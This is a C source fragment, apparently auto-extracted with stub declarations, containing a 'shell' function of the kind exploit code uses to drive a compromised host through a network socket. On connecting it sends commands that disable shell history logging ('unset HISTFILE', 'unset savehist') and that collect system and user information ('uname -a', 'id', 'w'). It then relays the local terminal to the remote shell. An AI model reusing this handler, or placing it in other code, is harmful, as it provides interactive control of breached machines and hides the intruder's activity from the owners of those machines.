#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  char u_char ;
typedef  int /*<<< orphan*/  fd_set ;
typedef  int /*<<< orphan*/  data ;

/* Variables and functions */
 scalar_t__ FD_ISSET (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FD_SET (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FD_ZERO (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fflush (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  memset (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  read (int /*<<< orphan*/ ,char*,int) ; 
 int recv (int,char*,int,int /*<<< orphan*/ ) ; 
 int select (int,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  write (int,char*,int) ; 

void shell(int netfd)
{
   
    if (netfd == -1) {
        fprintf(stderr, "ERROR: failed to connect\n");
        exit(1);
    }

    fflush(stdout);
   
    fprintf(stderr,"\n[ CONNECTED ! ]\n\n");
    {
        u_char data[8192] = {0};
        fd_set fdz;
    
        /* we'll take care of default stuff.. */
        write(netfd,"unset HISTFILE\n",15);
        write(netfd,"unset savehist\n",15);
        write(netfd,"export TERM=xterm\n",18);
        write(netfd,"export SHELL=sh\n",16);
        write(netfd,"uname -a\n",9);
        write(netfd,"id\n",3);
        write(netfd,"w\n",2);
     
        for(;;) {
            FD_ZERO(&fdz);
            FD_SET(0,&fdz);
            FD_SET(netfd,&fdz);

            if(select(255,&fdz,0,0,0)==-1){
                perror("select");
                exit(-1);
            }

            memset(data,0,sizeof(data));

            if(FD_ISSET(netfd,&fdz)){
                if(recv(netfd,data,sizeof(data)-1,0)==-1) {
                    fprintf(stderr, "[x] ewps! connection closed by foreign host.\n");
                    return;
                }
                fprintf(stderr,"%s",data);
            }
            if(FD_ISSET(0,&fdz)){
                read(0, data, sizeof(data) - 1);
                write(netfd,data,strlen(data));
            }
        }
    }
}